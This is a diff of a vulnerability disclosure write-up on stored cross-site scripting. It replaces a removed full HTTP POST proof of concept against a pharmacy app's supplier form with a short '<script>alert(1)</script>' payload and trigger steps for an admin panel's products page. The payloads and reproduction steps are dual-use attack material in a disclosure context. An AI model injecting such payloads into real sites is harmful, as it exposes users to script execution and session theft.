@@ -10,89 +10,25 @@ In editItemForm.php. There are unrestricted stored cross site scripting attacks 
 
 **Code analysis**    
 
-Querying data from the database and storing it in the $reg\[$cont\]\['nome'\], and the echo nome is not filtered, resulting in the execution of XSS statements.
+Updating and Querying data from the database and storing it in the <?=$row1['product_name']?>, and the echo product_name is not filtered, resulting in the execution of XSS statements.
 
-![image-20241128083927477](https://github.com/user-attachments/assets/575b0ac7-8215-478c-99f8-b9a5bd11756c)
-
-
+![image](https://github.com/Rocky-Bull/myCVE/blob/main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20142316.png)
 
 ## POC
 
 ```
-POST /adicionar-fornecedor.php HTTP/1.1
-Host: farmacia
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------343575567911858812221258670237
-Content-Length: 1452
-Origin: http://farmacia
-Connection: close
-Referer: http://farmacia/adicionar-fornecedor.php
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="nome"
-
-<script>alert('xss');</script>
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="cpf"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="inscricao"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="endereco"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="numero"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="bairro"
-
-11
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="cidade"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="cep"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="uf"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="telefone"
-
-1
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="email"
-
-1@outlook.com
------------------------------343575567911858812221258670237
-Content-Disposition: form-data; name="acao"
-
-
------------------------------343575567911858812221258670237--
-
+<script>alert(1)</script>
 ```
 
-![image-20241127093510427](https://github.com/user-attachments/assets/d301c25b-df2d-43c7-8de4-f4bb2f5fe0a3)
-
-Visit this URL to trigger the cross-site scripting vulnerability.
+![image](https://github.com/Rocky-Bull/myCVE/blob/main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20141045.png)
+![image](https://github.com/Rocky-Bull/myCVE/blob/main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20141051.png)
+![image](https://github.com/Rocky-Bull/myCVE/blob/main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20141407.png)
+Click this Products button to trigger the cross-site scripting vulnerability.
 
 ```
-http://farmacia/adicionar-produto.php
+http://localhost/admin_panel/#products
 ```
 
 **Result**
 
-![image-20241126221600209](https://github.com/user-attachments/assets/4ac05f98-aa5b-4e97-a50c-3c8ed574c663)
+![image]([https://github.com/user-attachments/assets/4ac05f98-aa5b-4e97-a50c-3c8ed574c663](https://github.com/Rocky-Bull/myCVE/blob/main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20141108.png))
